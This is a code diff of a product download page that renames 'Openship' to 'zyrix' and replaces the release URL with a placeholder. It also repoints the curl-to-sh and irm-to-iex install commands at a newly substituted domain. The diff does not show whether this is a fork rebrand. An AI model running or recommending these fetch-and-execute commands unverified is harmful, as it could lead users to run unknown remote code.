@@ -40,21 +40,21 @@ type DownloadEntry = {
 };
 
 const DOWNLOADS: DownloadEntry[] = [
-  { platform: "mac-arm",   title: "macOS",   subtitle: "Apple Silicon (M1–M4)", icon: AppleIcon,   fileName: "Openship-arm64.dmg",   size: "84 MB" },
-  { platform: "mac-intel", title: "macOS",   subtitle: "Intel x86_64",          icon: AppleIcon,   fileName: "Openship-x64.dmg",     size: "92 MB" },
-  { platform: "windows",   title: "Windows", subtitle: "Windows 10/11 · 64-bit", icon: WindowsIcon, fileName: "Openship-win32-x64.zip", size: "76 MB" },
-  { platform: "linux",     title: "Linux",   subtitle: "AppImage · x86_64",     icon: LinuxIcon,   fileName: "Openship.AppImage",    size: "98 MB" },
+  { platform: "mac-arm",   title: "macOS",   subtitle: "Apple Silicon (M1–M4)", icon: AppleIcon,   fileName: "zyrix-arm64.dmg",   size: "84 MB" },
+  { platform: "mac-intel", title: "macOS",   subtitle: "Intel x86_64",          icon: AppleIcon,   fileName: "zyrix-x64.dmg",     size: "92 MB" },
+  { platform: "windows",   title: "Windows", subtitle: "Windows 10/11 · 64-bit", icon: WindowsIcon, fileName: "zyrix-win32-x64.zip", size: "76 MB" },
+  { platform: "linux",     title: "Linux",   subtitle: "AppImage · x86_64",     icon: LinuxIcon,   fileName: "zyrix.AppImage",    size: "98 MB" },
 ];
 
-const DOWNLOAD_BASE = "https://github.com/oblien/openship/releases/latest/download";
+const DOWNLOAD_BASE = "https://github.com/#";
 
 const CLI_OPTIONS = [
-  { manager: "macOS / Linux", cmd: "curl -fsSL https://get.openship.io | sh" },
-  { manager: "Windows",       cmd: "irm https://git.openship.io/windows | iex" },
-  { manager: "npm",  cmd: "npm i -g openship" },
-  { manager: "pnpm", cmd: "pnpm add -g openship" },
-  { manager: "yarn", cmd: "yarn global add openship" },
-  { manager: "bun",  cmd: "bun add -g openship" },
+  { manager: "macOS / Linux", cmd: "curl -fsSL https://get.zyrix.ir | sh" },
+  { manager: "Windows",       cmd: "irm https://git.zyrix.ir/windows | iex" },
+  { manager: "npm",  cmd: "npm i -g zyrix" },
+  { manager: "pnpm", cmd: "pnpm add -g zyrix" },
+  { manager: "yarn", cmd: "yarn global add zyrix" },
+  { manager: "bun",  cmd: "bun add -g zyrix" },
 ];
 
 const STEPS = [
